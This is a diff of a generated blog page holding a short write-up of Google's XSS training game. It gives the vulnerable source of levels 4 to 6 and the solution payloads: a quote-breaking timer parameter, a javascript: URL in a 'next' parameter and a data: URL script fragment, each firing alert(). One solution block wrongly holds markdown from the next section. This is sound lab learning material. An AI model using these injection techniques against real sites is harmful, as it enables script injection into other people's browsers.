@@ -82,13 +82,13 @@
 
 
 
-<meta name="description" content="Google Xss gameLevel 3 This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubuser">
+<meta name="description" content="Google Xss game Level 3  This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubus">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Google_Game">
 <meta property="og:url" content="http://yoursite.com/2019/06/12/Google-Game/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="Google Xss gameLevel 3 This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubuser">
+<meta property="og:description" content="Google Xss game Level 3  This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubus">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png">
@@ -96,7 +96,7 @@
 <meta property="og:updated_time" content="2019-07-04T08:21:04.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Google_Game">
-<meta name="twitter:description" content="Google Xss gameLevel 3 This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubuser">
+<meta name="twitter:description" content="Google Xss game Level 3  This website provides some API (after the arch pointer). solution: src123456789101112131415161718192021222324252627282930313233### level 4![image](https://user-images.githubus">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png">
 
 
@@ -365,7 +365,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  363
+                  364
                 </span>
               
 
@@ -402,26 +402,25 @@
       
 
       
-        <h1 id="Google-Xss-game"><a href="#Google-Xss-game" class="headerlink" title="Google Xss game"></a>Google Xss game</h1><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png" alt="image"></p>
+        <h1>Google Xss game</h1>
+<h3 id="Level-3">Level 3</h3>
+<p><img src="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png" alt="image"></p>
 <p>This website provides some API (after the arch pointer).</p>
 <p>solution:</p>
 <figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### level 4</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58806619-2b60a780-8649-11e9-8fa4-2f75a62e5e1b.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function startTimer(seconds) &#123;</span><br><span class="line">        seconds = parseInt(seconds) || 3;</span><br><span class="line">        setTimeout(function() &#123; </span><br><span class="line">          window.confirm(&quot;Time is up!&quot;);</span><br><span class="line">          window.history.back();</span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level4&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;&#123;&#123; timer &#125;&#125;&apos;);&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
 <p>solution:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p><img src="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png" alt="image"></p>
+<h3 id="level-5">level 5</h3>
+<p><img src="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png" alt="image"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--signup.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/game-frame.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/game-frame-styles.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"level5"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/logos/level5.png"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"reader-email"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; next &#125;&#125;"</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>solution: </p>
+<p>solution:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
-
 <p>and click the <code>Next</code> button.</p>
-<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p><img src="https://user-images.githubusercontent.com/40637063/58806432-c1480280-8648-11e9-8d7f-eb763e2a0757.png" alt="image"></p>
+<h3 id="level-6">level 6</h3>
+<p><img src="https://user-images.githubusercontent.com/40637063/58806432-c1480280-8648-11e9-8d7f-eb763e2a0757.png" alt="image"></p>
 <p>This website allow user to execute alternative js script</p>
 <p>solution:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#data:text/plain,alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -537,7 +536,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -681,7 +680,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Google-Xss-game"><span class="nav-number">1.</span> <span class="nav-text">Google Xss game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3"><span class="nav-number">1.0.1.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-5"><span class="nav-number">1.0.2.</span> <span class="nav-text">level 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-6"><span class="nav-number">1.0.3.</span> <span class="nav-text">level 6</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">Google Xss game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3"><span class="nav-number">1.0.1.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-5"><span class="nav-number">1.0.2.</span> <span class="nav-text">level 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-6"><span class="nav-number">1.0.3.</span> <span class="nav-text">level 6</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -715,7 +714,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59.7k</span>
+    <span title="Site words total count">61.5k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
